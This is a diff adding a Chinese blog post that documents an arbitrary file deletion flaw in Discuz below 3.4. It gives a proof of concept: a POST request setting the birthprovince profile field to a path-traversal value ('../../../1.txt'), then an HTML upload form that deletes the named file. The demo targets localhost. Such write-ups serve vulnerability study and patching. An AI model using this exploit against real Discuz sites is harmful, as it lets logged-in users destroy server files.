@@ -152,6 +152,79 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Discuz＜3.4_birthprovince前台任意文件删除" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Discuz-＜3-4-birthprovince-前台任意文件删除"><a href="#Discuz-＜3-4-birthprovince-前台任意文件删除" class="headerlink" title="Discuz_＜3.4_birthprovince_前台任意文件删除"></a>Discuz_＜3.4_birthprovince_前台任意文件删除</h2><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>Discuz &lt; 3.4 版本</p>
+<p>需要会员身份登陆站点。</p>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>测试：</p>
+<ol>
+<li>为了不破坏原有程序，在根目录下新建 1.txt 作为演示。</li>
+</ol>
+<p><img src="E:%5C%E6%A1%8C%E9%9D%A2%5C1.png" alt="1"></p>
+<ol>
+<li>登陆前台，访问 <a href="http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&amp;ac=profile&amp;op=base" target="_blank" rel="noopener">http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&amp;ac=profile&amp;op=base</a></li>
+</ol>
+<p>先发起一个POST请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">birthprovince=../../../1.txt&amp;profilesubmit=1&amp;formhash=18a19dce</span><br><span class="line">// formhash 需要右键查看源代码得到</span><br></pre></td></tr></table></figure>
+
+<p>成功后，个人信息已经被修改成如下:</p>
+<p><img src="E:%5C%E6%A1%8C%E9%9D%A2%5Cchanged.png" alt="changed"></p>
+<ol>
+<li>最后，本地提交POST表单删除文件 1.txt</li>
+</ol>
+<p>表单内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&amp;ac=profile&amp;op=base&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;formhash&quot; value=&quot;18a19dce&quot;/&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/from&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随便上传一个图片提交会导致删除 birthprovince 设置的文件名称，在这里是 1.txt。</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
+<li><a href="http://www.freebuf.com/vuls/149904.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/149904.html</a></li>
+<li><a href="http://www.freebuf.com/articles/system/149810.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/149810.html</a></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="2019/10/17/Discuz＜3.4_birthprovince前台任意文件删除/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-sdsdd" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
